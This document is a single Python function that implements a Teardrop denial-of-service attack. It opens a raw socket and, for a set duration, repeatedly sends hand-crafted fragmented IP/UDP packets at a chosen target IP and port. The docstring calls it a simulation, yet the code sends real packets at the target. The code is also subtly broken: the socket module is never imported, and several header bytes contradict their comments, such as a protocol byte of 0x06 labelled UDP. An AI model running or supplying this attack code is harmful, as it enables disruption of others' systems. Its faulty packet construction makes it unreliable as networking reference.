import time
from random import randint

def teardrop_attack(target_ip: str, target_port: int, duration: int) -> None:
    """
    This function simulates a Teardrop attack by sending a high volume of overlapping fragmented packets
    to the target IP and port for the specified duration.

    :param target_ip: The IP address of the target.
    :param target_port: The port number of the target.
    :param duration: The duration of the attack in seconds.
    
    The function should continue sending overlapping fragmented packets to the target IP and port for the specified duration.
    """
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            
            # Create a fragmented packet
            ip_header = b'\x45\x00\x00\x1c'  # Version, IHL, Type of Service, Total Length
            ip_header += b'\xab\xcd\x00\x00'  # Identification
            ip_header += b'\x40\x08'  # Flags (More Fragments), Fragment Offset
            ip_header += b'\x40\x06'  # TTL, Protocol (UDP)
            ip_header += b'\x00\x00'  # Checksum (0 for now, will be calculated by kernel)
            ip_header += socket.inet_aton(target_ip)  # Source IP
            ip_header += socket.inet_aton(target_ip)  # Destination IP
            
            udp_header = b'\x00\x35'  # Source Port
            udp_header += b'\x00\x35'  # Destination Port
            udp_header += b'\x00\x1c'  # Length
            udp_header += b'\x00\x00'  # Checksum (0 for now, will be calculated by kernel)
            
            payload = b'A' * 28  # Payload to fill the packet
            
            packet = ip_header + udp_header + payload
            
            s.sendto(packet, (target_ip, target_port))
        except Exception as e:
            print(f"Error: {e}")
        finally:
            s.close()
